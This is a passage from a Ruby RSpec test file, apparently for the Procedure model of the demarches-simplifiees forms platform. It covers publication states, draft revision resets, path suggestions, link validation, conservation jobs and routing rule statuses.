    context 'when a type de champ is transformed from a drop_down_list with referentiel to a textarea' do
      let(:procedure) { create(:procedure, types_de_champ_public:) }
      let(:types_de_champ_public) { [{ type: :drop_down_list, referentiel:, drop_down_mode: 'advanced' }] }
      let(:referentiel) { create(:csv_referentiel, :with_items) }
      let(:tdc) { procedure.draft_revision.types_de_champ_public.last }

      before do
        procedure.draft_revision.types_de_champ_public.last.update(type_champ: :textarea, options: { "character_limit" => "" })
      end

      it 'nullifies the referentiel' do
        expect(procedure.draft_revision.types_de_champ_public.first.referentiel).to be_nil
      end
    end
  end

  describe "#reset_draft_revision!" do
    let(:procedure) { create(:procedure) }
    let(:tdc_attributes) { { type_champ: :number, libelle: 'libelle 1' } }
    let(:publication_date) { Time.zone.local(2021, 1, 1, 12, 00, 00) }

    context "brouillon procedure" do
      it "should not reset draft revision" do
        procedure.draft_revision.add_type_de_champ(tdc_attributes)
        previous_draft_revision = procedure.draft_revision

        procedure.reset_draft_revision!
        expect(procedure.draft_revision).to eq(previous_draft_revision)
      end
    end

    context "published procedure" do
      let(:procedure) do
        create(
          :procedure,
          :published,
          attestation_acceptation_template: build(:attestation_template),
          dossier_submitted_message: create(:dossier_submitted_message),
          types_de_champ_public: [{ type: :text, libelle: 'published tdc' }]
        )
      end

      it "should reset draft revision" do
        procedure.draft_revision.add_type_de_champ(tdc_attributes)
        previous_draft_revision = procedure.draft_revision
        previous_attestation_template = procedure.attestation_acceptation_template
        previous_dossier_submitted_message = previous_draft_revision.dossier_submitted_message

        expect(procedure.draft_changed?).to be_truthy
        procedure.reset_draft_revision!
        expect(procedure.draft_changed?).to be_falsey
        expect(procedure.draft_revision).not_to eq(previous_draft_revision)
        expect { previous_draft_revision.reload }.to raise_error(ActiveRecord::RecordNotFound)
        expect(procedure.attestation_acceptation_template).to eq(previous_attestation_template)
        expect(procedure.draft_revision.dossier_submitted_message).to eq(previous_dossier_submitted_message)
      end

      it "should erase orphan tdc" do
        published_tdc = procedure.published_revision.types_de_champ.first
        draft_tdc = procedure.draft_revision.add_type_de_champ(tdc_attributes)

        procedure.reset_draft_revision!

        expect { published_tdc.reload }.not_to raise_error
        expect { draft_tdc.reload }.to raise_error(ActiveRecord::RecordNotFound)
      end
    end
  end

  describe "#unpublish!" do
    let(:procedure) { create(:procedure, :published) }
    let(:now) { Time.zone.now.beginning_of_minute }

    before do
      travel_to(now) do
        procedure.unpublish!
      end
    end

    it {
      expect(procedure.closed_at).to eq(nil)
      expect(procedure.published_at).not_to be_nil
      expect(procedure.unpublished_at).to eq(now)
    }

    it 'sets published revision' do
      expect(procedure.published_revision).not_to be_nil
      expect(procedure.draft_revision).not_to be_nil
      expect(procedure.revisions.count).to eq(2)
      expect(procedure.revisions).to eq([procedure.published_revision, procedure.draft_revision])
    end
  end

  describe "#brouillon?" do
    let(:procedure_brouillon) { build(:procedure) }
    let(:procedure_publiee) { build(:procedure, :published) }
    let(:procedure_close) { build(:procedure, :closed) }
    let(:procedure_depubliee) { build(:procedure, :unpublished) }

    it do
      expect(procedure_brouillon.brouillon?).to be_truthy
      expect(procedure_publiee.brouillon?).to be_falsey
      expect(procedure_close.brouillon?).to be_falsey
      expect(procedure_depubliee.brouillon?).to be_falsey
    end
  end

  describe "#publiee?" do
    let(:procedure_brouillon) { build(:procedure) }
    let(:procedure_publiee) { build(:procedure, :published) }
    let(:procedure_close) { build(:procedure, :closed) }
    let(:procedure_depubliee) { build(:procedure, :unpublished) }

    it do
      expect(procedure_brouillon.publiee?).to be_falsey
      expect(procedure_publiee.publiee?).to be_truthy
      expect(procedure_close.publiee?).to be_falsey
      expect(procedure_depubliee.publiee?).to be_falsey
    end
  end

  describe "#close?" do
    let(:procedure_brouillon) { build(:procedure) }
    let(:procedure_publiee) { build(:procedure, :published) }
    let(:procedure_close) { build(:procedure, :closed) }
    let(:procedure_depubliee) { build(:procedure, :unpublished) }

    it do
      expect(procedure_brouillon.close?).to be_falsey
      expect(procedure_publiee.close?).to be_falsey
      expect(procedure_close.close?).to be_truthy
      expect(procedure_depubliee.close?).to be_falsey
    end
  end

  describe "#depubliee?" do
    let(:procedure_brouillon) { build(:procedure) }
    let(:procedure_publiee) { build(:procedure, :published) }
    let(:procedure_close) { build(:procedure, :closed) }
    let(:procedure_depubliee) { build(:procedure, :unpublished) }

    it do
      expect(procedure_brouillon.depubliee?).to be_falsey
      expect(procedure_publiee.depubliee?).to be_falsey
      expect(procedure_close.depubliee?).to be_falsey
      expect(procedure_depubliee.depubliee?).to be_truthy
    end
  end

  describe "#locked?" do
    let(:procedure_brouillon) { build(:procedure) }
    let(:procedure_publiee) { build(:procedure, :published) }
    let(:procedure_close) { build(:procedure, :closed) }
    let(:procedure_depubliee) { build(:procedure, :unpublished) }

    it do
      expect(procedure_brouillon.locked?).to be_falsey
      expect(procedure_publiee.locked?).to be_truthy
      expect(procedure_close.locked?).to be_truthy
      expect(procedure_depubliee.locked?).to be_truthy
    end
  end

  describe 'close' do
    let(:procedure) { create(:procedure, :published) }
    let(:now) { Time.zone.now.beginning_of_minute }
    before do
      travel_to(now) do
        procedure.close!
      end
      procedure.reload
    end

    it do
      expect(procedure.close?).to be_truthy
      expect(procedure.closed_at).to eq(now)
    end

    it 'sets published revision' do
      expect(procedure.published_revision).not_to be_nil
      expect(procedure.draft_revision).not_to be_nil
      expect(procedure.revisions.count).to eq(2)
      expect(procedure.revisions).to eq([procedure.published_revision, procedure.draft_revision])
    end
  end

  describe 'total_dossier' do
    let(:procedure) { create :procedure }

    before do
      create :dossier, procedure: procedure, state: Dossier.states.fetch(:en_construction)
      create :dossier, procedure: procedure, state: Dossier.states.fetch(:brouillon)
      create :dossier, procedure: procedure, state: Dossier.states.fetch(:en_construction)
    end

    subject { procedure.total_dossier }

    it { is_expected.to eq 2 }
  end

  describe 'suggested_path' do
    let!(:procedure) { create(:procedure, aasm_state: :publiee, libelle: 'Inscription au Collège', zones: [create(:zone)]) }
    let(:path) { nil }

    before do
      travel(3.seconds)
      procedure.claim_path!(procedure.administrateurs.first, path)
    end

    subject { procedure.suggested_path }

    context 'when the path has been customized' do
      let(:path) { 'custom_path' }

      it { is_expected.to eq 'custom_path' }
    end

    context 'when the suggestion does not conflict' do
      it { is_expected.to eq 'inscription-au-college' }
    end

    context 'when the suggestion conflicts with one procedure' do
      before do
        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', zones: [create(:zone)])
      end

      it { is_expected.to eq 'inscription-au-college-2' }
    end

    context 'when the suggestion conflicts with several procedures' do
      before do
        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', zones: [create(:zone)])
        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college-2', zones: [create(:zone)])
      end

      it { is_expected.to eq 'inscription-au-college-3' }
    end

    context 'when the suggestion conflicts with another procedure of the same admin' do
      before do
        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', administrateurs: procedure.administrateurs, zones: [create(:zone)])
      end

      it { is_expected.to eq 'inscription-au-college-2' }
    end
  end

  describe ".default_scope" do
    let!(:procedure) { create(:procedure, hidden_at: hidden_at) }

    context "when hidden_at is nil" do
      let(:hidden_at) { nil }

      it do
        expect(Procedure.count).to eq(1)
        expect(Procedure.all).to include(procedure)
      end
    end

    context "when hidden_at is not nil" do
      let(:hidden_at) { 2.days.ago }

      it do
        expect(Procedure.count).to eq(0)
        expect { Procedure.find(procedure.id) }.to raise_error(ActiveRecord::RecordNotFound)
      end
    end
  end

  describe "#discard_and_keep_track!" do
    let(:super_admin) { create(:super_admin) }
    let(:procedure) { create(:procedure) }
    let!(:dossier) { create(:dossier, procedure: procedure) }
    let!(:dossier2) { create(:dossier, procedure: procedure) }
    let(:instructeur) { create(:instructeur) }

    it do
      expect(Dossier.count).to eq(2)
      expect(Dossier.all).to include(dossier, dossier2)
    end

    context "when discarding procedure" do
      before do
        instructeur.followed_dossiers << dossier
        procedure.discard_and_keep_track!(super_admin)
        instructeur.reload
      end

      it do
        expect(procedure.dossiers.count).to eq(0)
        expect(Dossier.count).to eq(0)
        expect(instructeur.followed_dossiers).not_to include(dossier)
      end
    end
  end

  describe "#organisation_name" do
    subject { procedure.organisation_name }
    context 'when the procedure has a service (and no organization)' do
      let(:procedure) { create(:procedure, :with_service, organisation: nil) }
      it { is_expected.to eq procedure.service.nom }
    end

    context 'when the procedure has an organization (and no service)' do
      let(:procedure) { create(:procedure, organisation: 'DDT des Vosges', service: nil) }
      it { is_expected.to eq procedure.organisation }
    end
  end

  describe '#juridique_required' do
    it 'automatically jumps to true once cadre_juridique or deliberation have been set' do
      p = create(
        :procedure,
        juridique_required: false,
        cadre_juridique: nil
      )

      expect(p.juridique_required).to be_falsey

      p.update(cadre_juridique: 'cadre')
      expect(p.juridique_required).to be_truthy

      p.update(cadre_juridique: nil)
      expect(p.juridique_required).to be_truthy

      p.update_columns(cadre_juridique: nil, juridique_required: false)
      p.reload
      expect(p.juridique_required).to be_falsey

      @deliberation = fixture_file_upload('spec/fixtures/files/file.pdf', 'application/pdf')
      p.update(deliberation: @deliberation)
      p.reload
      expect(p.juridique_required).to be_truthy
    end
  end

  describe '.ensure_a_groupe_instructeur_exists' do
    let(:procedure) { create(:procedure, groupe_instructeurs: []) }

    it do
      expect(procedure.groupe_instructeurs.count).to eq(1)
      expect(procedure.groupe_instructeurs.first.label).to eq(GroupeInstructeur::DEFAUT_LABEL)
      expect(procedure.defaut_groupe_instructeur_id).not_to be_nil
    end
  end

  describe '.missing_instructeurs?' do
    let!(:procedure) { create(:procedure) }

    subject { procedure.missing_instructeurs? }

    it { is_expected.to be true }

    context 'when an instructeur is assign to this procedure' do
      let!(:instructeur) { create(:instructeur) }

      before { instructeur.assign_to_procedure(procedure) }

      it { is_expected.to be false }
    end
  end

  describe '.missing_zones?' do
    let(:procedure) { create(:procedure, zones: []) }

    subject { procedure.missing_zones? }

    it { is_expected.to be true }

    context 'when a procedure has zones' do
      let(:zone) { create(:zone) }

      before { procedure.zones << zone }

      it { is_expected.to be false }
    end
  end

  describe '.missing_steps' do
    subject { procedure.missing_steps.include?(step) }

    context 'without zone' do
      let(:procedure) { create(:procedure, zones: []) }
      let(:step) { :zones }
      it { is_expected.to be_truthy }
    end

    context 'with zone' do
      let(:procedure) { create(:procedure, zones: [create(:zone)]) }
      let(:step) { :zones }
      it { is_expected.to be_falsey }
    end

    context 'without service' do
      let(:procedure) { create(:procedure, service: nil) }
      let(:step) { :service }
      it { is_expected.to be_truthy }
    end

    context 'with service' do
      let(:procedure) { create(:procedure) }
      let(:step) { :service }
      it { is_expected.to be_truthy }
    end
  end

  describe "#destroy" do
    let(:procedure) { create(:procedure, :closed, :with_type_de_champ, :with_bulk_message) }

    before do
      procedure.discard!
    end

    it "can destroy procedure" do
      expect(procedure.revisions.count).to eq(2)
      expect(procedure.destroy).to be_truthy
    end
  end

  describe '#average_dossier_weight' do
    let(:procedure) { create(:procedure, :published, types_de_champ_public: [{ type: :piece_justificative }]) }

    before do
      create(:dossier, :accepte, :with_populated_champs, procedure:)
      create(:dossier, :accepte, :with_populated_champs, procedure:)
      create(:dossier, :accepte, :with_populated_champs, procedure:)
      ActiveStorage::Blob.first.update!(byte_size: 4)
      ActiveStorage::Blob.second.update!(byte_size: 5)
      ActiveStorage::Blob.third.update!(byte_size: 6)
    end

    it 'estimates average dossier weight' do
      expect(procedure.reload.average_dossier_weight).to eq(5 + Procedure::MIN_WEIGHT)
    end
  end

  describe 'lien_dpo' do
    it do
      expect(build(:procedure).valid?).to be(true)
      expect(build(:procedure, lien_dpo: 'dpo@ministere.amere').valid?).to be(true)
      expect(build(:procedure, lien_dpo: 'https://legal.fr/contact_dpo').valid?).to be(true)
      expect(build(:procedure, lien_dpo: 'askjdlad l akdj asd ').valid?).to be(false)
    end
  end

  describe 'factory' do
    let(:types_de_champ) { [{ type: :yes_no }, { type: :integer_number }] }

    context 'create' do
      let(:types_de_champ) { [{ type: :yes_no }, { type: :repetition, children: [{ type: :integer_number }] }] }
      let(:procedure) { create(:procedure, types_de_champ_public: types_de_champ) }

      context 'with brouillon procedure' do
        it do
          expect(procedure.draft_revision.types_de_champ_public.count).to eq(2)
          expect(procedure.draft_revision.types_de_champ.count).to eq(3)
        end
      end

      context 'with published procedure' do
        let(:procedure) { create(:procedure, :published, types_de_champ_public: types_de_champ) }

        it do
          expect(procedure.draft_revision.types_de_champ_public.count).to eq(2)
          expect(procedure.draft_revision.types_de_champ.count).to eq(3)
          expect(procedure.published_revision.types_de_champ_public.count).to eq(2)
          expect(procedure.published_revision.types_de_champ.count).to eq(3)
        end
      end
    end

    context 'with bouillon procedure' do
      let(:procedure) { build(:procedure, types_de_champ_public: types_de_champ, types_de_champ_private: types_de_champ) }

      it do
        expect(procedure.revisions.size).to eq(1)
        expect(procedure.draft_revision.types_de_champ.size).to eq(4)
        expect(procedure.draft_revision.types_de_champ_public.size).to eq(2)
        expect(procedure.published_revision).to be_nil
      end
    end

    context 'with published procedure' do
      let(:procedure) { build(:procedure, :published, types_de_champ_public: types_de_champ, types_de_champ_private: types_de_champ) }

      it do
        expect(procedure.revisions.size).to eq(2)
        expect(procedure.draft_revision.types_de_champ.size).to eq(4)
        expect(procedure.draft_revision.types_de_champ_public.size).to eq(2)
        expect(procedure.published_revision.types_de_champ.size).to eq(4)
        expect(procedure.published_revision.types_de_champ_public.size).to eq(2)
      end
    end

    context 'repetition' do
      let(:types_de_champ) do
        [
          { type: :yes_no },
          {
            type: :repetition,
            children: [
              { libelle: 'Nom', mandatory: true },
              { libelle: 'Prénom', mandatory: true },
              { libelle: 'Age', type: :integer_number, mandatory: false },
            ],
          },
        ]
      end
      let(:revision) { procedure.draft_revision }
      let(:repetition) { revision.revision_types_de_champ_public.last }

      context 'with bouillon procedure' do
        let(:procedure) { build(:procedure, types_de_champ_public: types_de_champ) }

        it do
          expect(revision.types_de_champ.size).to eq(5)
          expect(revision.types_de_champ_public.size).to eq(2)
          expect(revision.types_de_champ_public.map(&:type_champ)).to eq(['yes_no', 'repetition'])
          expect(repetition.revision_types_de_champ.size).to eq(3)
          expect(repetition.revision_types_de_champ.map(&:type_champ)).to eq(['text', 'text', 'integer_number'])
          expect(repetition.revision_types_de_champ.map(&:mandatory?)).to eq([true, true, false])
        end
      end

      context 'with published procedure' do
        let(:procedure) { build(:procedure, :published, types_de_champ_public: types_de_champ) }

        context 'draft revision' do
          it do
            expect(revision.types_de_champ.size).to eq(5)
            expect(revision.types_de_champ_public.size).to eq(2)
            expect(revision.types_de_champ_public.map(&:type_champ)).to eq(['yes_no', 'repetition'])
            expect(repetition.revision_types_de_champ.size).to eq(3)
            expect(repetition.revision_types_de_champ.map(&:type_champ)).to eq(['text', 'text', 'integer_number'])
            expect(repetition.revision_types_de_champ.map(&:mandatory?)).to eq([true, true, false])
          end
        end

        context 'published revision' do
          let(:revision) { procedure.published_revision }

          it do
            expect(revision.types_de_champ.size).to eq(5)
            expect(revision.types_de_champ_public.size).to eq(2)
            expect(revision.types_de_champ_public.map(&:type_champ)).to eq(['yes_no', 'repetition'])
            expect(repetition.revision_types_de_champ.size).to eq(3)
            expect(repetition.revision_types_de_champ.map(&:type_champ)).to eq(['text', 'text', 'integer_number'])
            expect(repetition.revision_types_de_champ.map(&:mandatory?)).to eq([true, true, false])
          end
        end
      end
    end
  end

  describe 'lien_notice' do
    let(:procedure) { build(:procedure, lien_notice:) }

    context 'when empty' do
      let(:lien_notice) { '' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid link' do
      let(:lien_notice) { 'https://www.demarches-simplifiees.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid link with accents' do
      let(:lien_notice) { 'https://www.démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when not a valid link' do
      let(:lien_notice) { 'www.démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_falsey }
    end

    context 'when an email' do
      let(:lien_notice) { 'test@demarches-simplifiees.fr' }
      it { expect(procedure.valid?).to be_falsey }
    end
  end

  describe 'lien_dpo' do
    let(:procedure) { build(:procedure, lien_dpo:) }

    context 'when empty' do
      let(:lien_dpo) { '' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid link' do
      let(:lien_dpo) { 'https://www.demarches-simplifiees.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid link with accents' do
      let(:lien_dpo) { 'https://www.démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid email' do
      let(:lien_dpo) { 'test@demarches-simplifiees.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid email with accents' do
      let(:lien_dpo) { 'test@démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when not a valid link' do
      let(:lien_dpo) { 'www.démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_falsey }
    end
  end

  describe 'extend_conservation_for_dossiers' do
    let(:duree_conservation_dossiers_dans_ds) { 2 }
    let(:procedure) { create(:procedure, duree_conservation_dossiers_dans_ds:) }
    let(:expiring_dossier_brouillon) { create(:dossier, :brouillon, procedure: procedure, brouillon_close_to_expiration_notice_sent_at: duree_conservation_dossiers_dans_ds.months.ago) }
    let(:expiring_dossier_en_construction) { create(:dossier, :en_construction, procedure: procedure, en_construction_close_to_expiration_notice_sent_at: duree_conservation_dossiers_dans_ds.months.ago) }
    let(:expiring_dossier_en_termine) { create(:dossier, :accepte, procedure: procedure, termine_close_to_expiration_notice_sent_at: duree_conservation_dossiers_dans_ds.months.ago) }
    let(:not_expiring_dossie) { create(:dossier, :accepte, procedure: procedure, created_at: duree_conservation_dossiers_dans_ds.months.ago) }
    before do
      procedure
      expiring_dossier_brouillon
      expiring_dossier_en_construction
      expiring_dossier_en_termine
      not_expiring_dossie
    end

    context 'when duree_conservation_dossiers_dans_ds does not changes' do
      it 'does not enqueues any job' do
        expect(ResetExpiringDossiersJob).not_to receive(:perform_later)
        procedure.update!(libelle: 'does not change duree_conservation_dossiers_dans_ds')
      end
    end

    context 'when duree_conservation_dossiers_dans_ds decreases' do
      it 'calls extend_conservation_for_dossiers' do
        expect(ResetExpiringDossiersJob).not_to receive(:perform_later)
        procedure.update(duree_conservation_dossiers_dans_ds: duree_conservation_dossiers_dans_ds - 1)
      end
    end

    context 'when duree_conservation_dossiers_dans_ds increases' do
      it 'calls extend_conservation_for_dossiers' do
        expect(ResetExpiringDossiersJob).to receive(:perform_later)
        procedure.update(duree_conservation_dossiers_dans_ds: duree_conservation_dossiers_dans_ds + 1)
      end
    end
  end

  describe "#attestation_template" do
    let(:procedure) { create(:procedure) }
    subject { procedure.reload }

    context "when there is a v2 draft and a v1" do
      before do
        create(:attestation_template, procedure: procedure)
        create(:attestation_template, :v2, :draft, procedure: procedure)
      end

      it { expect(subject.attestation_acceptation_template.version).to eq(1) }
    end

    context "when there is only a v1" do
      before do
        create(:attestation_template, procedure: procedure)
      end

      it { expect(subject.attestation_acceptation_template.version).to eq(1) }
    end

    context "when there is only a v2" do
      before do
        create(:attestation_template, :v2, procedure: procedure)
      end

      it { expect(subject.attestation_acceptation_template.version).to eq(2) }
    end

    context "when there is a v2 draft" do
      before do
        create(:attestation_template, :v2, :draft, procedure: procedure)
      end

      it { expect(subject.attestation_acceptation_template).to be_nil }

      context "and a published" do
        before do
          create(:attestation_template, :v2, :published, procedure: procedure)
        end

        it { expect(subject.attestation_acceptation_template).to be_published }
      end
    end
  end

  describe "#parsed_latest_zone_labels" do
    let!(:draft_procedure) { create(:procedure) }
    let!(:published_procedure) { create(:procedure_with_dossiers, :published, dossiers_count: 2) }
    let!(:closed_procedure) { create(:procedure, :closed) }
    let!(:procedure_detail_draft) { ProcedureDetail.new(id: draft_procedure.id, latest_zone_labels: '{ "zone1", "zone2" }') }
    let!(:procedure_detail_published) { ProcedureDetail.new(id: published_procedure.id, latest_zone_labels: '{ "zone3", "zone4" }') }
    let!(:procedure_detail_closed) { ProcedureDetail.new(id: closed_procedure.id, latest_zone_labels: '{ "zone5", "zone6" }') }
    context 'with parsed latest zone labels' do
      it 'parses the latest zone labels correctly' do
        expect(procedure_detail_draft.parsed_latest_zone_labels).to eq(["zone1", "zone2"])
        expect(procedure_detail_published.parsed_latest_zone_labels).to eq(["zone3", "zone4"])
        expect(procedure_detail_closed.parsed_latest_zone_labels).to eq(["zone5", "zone6"])
      end

      it 'returns an empty array for invalid JSON' do
        procedure_detail_draft.latest_zone_labels = '{ invalid json }'
        expect(procedure_detail_draft.parsed_latest_zone_labels).to eq([])
      end

      it 'returns an empty array when latest_zone_labels is nil' do
        procedure_detail_draft.latest_zone_labels = nil
        expect(procedure_detail_draft.parsed_latest_zone_labels).to eq([])
      end

      it 'returns an empty array when latest_zone_labels is empty' do
        procedure_detail_draft.latest_zone_labels = ''
        expect(procedure_detail_draft.parsed_latest_zone_labels).to eq([])
      end
    end
  end

  describe '#all_revisions_types_de_champ' do
    let(:types_de_champ_public) do
      [
        { type: :text },
        { type: :header_section },
      ]
    end

    context 'when procedure brouillon' do
      let(:procedure) { create(:procedure, types_de_champ_public:) }

      it 'returns one type de champ' do
        expect(procedure.all_revisions_types_de_champ.size).to eq 1
      end

      it 'returns also section type de champ' do
        expect(procedure.all_revisions_types_de_champ(with_header_section: true).size).to eq 2
      end

      it "returns types de champ on draft revision" do
        procedure.draft_revision.add_type_de_champ(type_champ: :text, libelle: 'onemorechamp')
        expect(procedure.reload.all_revisions_types_de_champ.size).to eq 2
      end
    end

    context 'when procedure is published' do
      let(:procedure) { create(:procedure, :published, types_de_champ_public:) }

      it 'returns one type de champ' do
        expect(procedure.all_revisions_types_de_champ.size).to eq 1
      end

      it 'returns also section type de champ' do
        expect(procedure.all_revisions_types_de_champ(with_header_section: true).size).to eq 2
      end

      it "doesn't return types de champ on draft revision" do
        procedure.draft_revision.add_type_de_champ(type_champ: :text, libelle: 'onemorechamp')
        expect(procedure.reload.all_revisions_types_de_champ.size).to eq 1
      end
    end
  end

  describe '#update_labels_position' do
    let(:procedure) { create(:procedure) }
    let!(:labels) { create_list(:label, 5, procedure_id: procedure.id) }

    it 'updates the positions of the specified instructeurs_procedures' do
      procedure.update_labels_position(labels.map(&:id))

      expect(procedure.labels.reload.pluck(:id, :position)).to match_array([
        [labels[0].id, 0],
        [labels[1].id, 1],
        [labels[2].id, 2],
        [labels[3].id, 3],
        [labels[4].id, 4],
      ])
    end
  end

  describe '#enable_pro_connect_restriction!' do
    let(:procedure) { create(:procedure, opendata: true, robots_indexable: true) }

    context 'when setting to :none' do
      it 'updates restriction level without changing opendata/robots_indexable' do
        procedure.enable_pro_connect_restriction!(:none)
        expect(procedure).to be_pro_connect_restriction_none
        expect(procedure.opendata).to be true
        expect(procedure.robots_indexable).to be true
      end
    end

    context 'when setting to :instructeurs' do
      it 'updates restriction level without changing opendata/robots_indexable' do
        procedure.enable_pro_connect_restriction!(:instructeurs)
        expect(procedure).to be_pro_connect_restriction_instructeurs
        expect(procedure.opendata).to be true
        expect(procedure.robots_indexable).to be true
      end
    end

    context 'when setting to :all' do
      it 'updates restriction level and disables opendata and robots_indexable' do
        procedure.enable_pro_connect_restriction!(:all)
        expect(procedure).to be_pro_connect_restriction_all
        expect(procedure.opendata).to be false
        expect(procedure.robots_indexable).to be false
      end
    end
  end

  describe 'routing rule statuses management' do
    include Logic

    let(:admin) { create :administrateur }
    let(:procedure) { create(:procedure, :published, routing_enabled: true, administrateur: admin) }
    let(:stable_id) { procedure.published_revision.types_de_champ_public.last.stable_id }

    before do
      procedure.draft_revision.add_type_de_champ(
        type_champ: :drop_down_list,
        libelle: 'Ville',
        drop_down_options: ['Paris', 'Lyon', 'Marseille']
      )
      procedure.publish_revision!(admin)
    end

    describe '#update_all_groupes_rule_validity_status' do
      let!(:gi_valid) do
        create(:groupe_instructeur,
               procedure: procedure,
               routing_rule: ds_eq(champ_value(stable_id), constant('Paris')))
      end
      let!(:gi_invalid) do
        create(:groupe_instructeur,
               procedure: procedure,
               routing_rule: ds_eq(champ_value(999), constant('Invalid')),
               valid_routing_rule: true)
      end

      it 'updates valid_routing_rule for all groupes instructeurs' do
        expect { procedure.update_all_groupes_rule_validity_status }
          .to change { gi_valid.reload.valid_routing_rule }.from(false).to(true)
          .and change { gi_invalid.reload.valid_routing_rule }.from(true).to(false)
      end
    end

    describe '#update_all_groupes_rule_unicity_status' do
      let!(:gi_unique) do
        create(:groupe_instructeur,
               procedure: procedure,
               routing_rule: ds_eq(champ_value(stable_id), constant('Paris')),
               unique_routing_rule: false)
      end
      let!(:gi_duplicate1) do
        create(:groupe_instructeur,
               procedure: procedure,
               routing_rule: ds_eq(champ_value(stable_id), constant('Lyon')),
               unique_routing_rule: true)
      end
      let!(:gi_duplicate2) do
        create(:groupe_instructeur,
               procedure: procedure,
               routing_rule: ds_eq(champ_value(stable_id), constant('Lyon')),
               unique_routing_rule: true)
      end
      let!(:gi_nil) do
        create(:groupe_instructeur,
               procedure: procedure,
               routing_rule: nil,
               unique_routing_rule: true)
      end

      it 'updates unique_routing_rule based on duplication and null status' do
        expect { procedure.update_all_groupes_rule_unicity_status }
          .to change { gi_unique.reload.unique_routing_rule }.from(false).to(true)
          .and change { gi_duplicate1.reload.unique_routing_rule }.from(true).to(false)
          .and change { gi_duplicate2.reload.unique_routing_rule }.from(true).to(false)
          .and change { gi_nil.reload.unique_routing_rule }.from(true).to(false)
      end
    end

    describe '#update_all_groupes_rule_statuses' do
      let!(:gi) do
        create(:groupe_instructeur,
               procedure: procedure,
               routing_rule: ds_eq(champ_value(stable_id), constant('Paris')))
      end

      it 'calls both validity and unicity status updates' do
        expect(procedure).to receive(:update_all_groupes_rule_validity_status).and_call_original
        expect(procedure).to receive(:update_all_groupes_rule_unicity_status).and_call_original

        procedure.update_all_groupes_rule_statuses
      end

      it 'updates both valid_routing_rule and unique_routing_rule' do
        expect { procedure.update_all_groupes_rule_statuses }
          .to change { gi.reload.valid_routing_rule }.from(false).to(true)
          .and change { gi.reload.unique_routing_rule }.from(false).to(true)
      end
    end
  end

  private

  def create_dossier_with_pj_of_size(size, procedure)
    dossier = create(:dossier, :accepte, procedure: procedure)
    create(:champ_piece_justificative, size: size, dossier: dossier)
  end
end
